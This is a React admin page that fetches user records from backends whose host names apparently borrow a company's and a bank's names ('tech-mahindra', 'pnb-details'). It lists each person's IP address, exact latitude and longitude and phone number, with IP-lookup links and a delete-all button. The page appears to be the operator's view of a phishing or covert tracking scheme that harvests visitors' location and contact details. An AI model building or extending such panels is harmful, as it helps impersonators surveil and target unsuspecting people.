import React, { useEffect ,useState} from 'react'

const AdminPage = () => {
    const [userData, setUserData] = useState([]);
    // const url = "http://localhost:5000/api"
    const url = "https://tech-mahindra.onrender.com/api"
    // const url = "https://pnb-details.vercel.app/api/"

    useEffect(() => {
    const fetchData = async () => {
        try {
          const response = await fetch(`${url}/user_enter_number_get`);
          const data = await response.json();
          if (data.status) {
            setUserData(data.msg);
            console.log(data);
          } else {
            console.error("Error fetching data:", data.error);
          }
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      };
  
      fetchData();
      deletehandel()



    },[] );

    const deletehandel=()=>{
      const fetchData = async () => {
        try {
          const response = await fetch(`${url}/delete_unusal_data`, {
            method: 'DELETE',
            headers: {
              'Content-Type': 'application/json'
            }
          });          
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      };
  
      fetchData();
    }

    const deletehandelall=()=>{
      const fetchData = async () => {
        try {
          const response = await fetch(`${url}/delete_All`, {
            method: 'DELETE',
            headers: {
              'Content-Type': 'application/json'
            }
          });          
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      };
  
      fetchData();
    }
    if(userData.length>0){
    console.log(userData);
    console.log(userData[0].ipaddress);

    console.log(userData[0].location);
    console.log(userData[0].phoneno);
}
  return (
    <>
     <div>
      <h2>User Data </h2>
      <ul>
         <button onClick={deletehandelall}>deleteAll</button>
        { userData.map((user, index) => (<>
          <li key={index}>
            {/* <p>Phone Number: {user.phoneno}</p>
            <p>Country Code: {user.countrycode.value} - {user.countrycode.label}</p>
            <p>Location: Latitude: {user.location.latitude}, Longitude: {user.location.longitude}</p>
             */}
          </li>
        <li key={index}>
            ip : <p>{user.ipaddress}</p>
            {user.location && (
              <>
              
              location: <p>Latitude: {user.location.latitude}, Longitude: {user.location.longitude}</p>
             <div style={{display:"flex"}}>   phoneno : {user.phoneno}   </div> 
              </>

            )}

            <h2> {user.ipaddress && 
            (
                <a href={`https:www.ip2location.com/demo/${user.ipaddress}`}
                target='_blank'
                rel='noreferrer' >ip2location</a>
            )
            } </h2>

        </li>
       </> ))}
      </ul>
    </div>
    </>
  )
}

export default AdminPage